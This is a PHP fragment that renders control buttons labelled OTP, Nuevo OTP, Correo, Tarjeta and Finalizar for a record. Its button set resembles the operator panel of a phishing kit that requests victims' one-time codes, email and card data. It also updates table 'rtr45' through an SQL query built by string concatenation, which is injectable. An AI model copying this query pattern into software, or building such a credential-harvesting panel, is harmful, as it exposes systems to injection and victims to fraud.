					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
				</tr>
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>

		</div>
		';

}



function actualizar_estado($reg,$est){
	if ($con = conectar()) {
		if (sentencia($con,"UPDATE rtr45 SET status = '".$est."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}

?>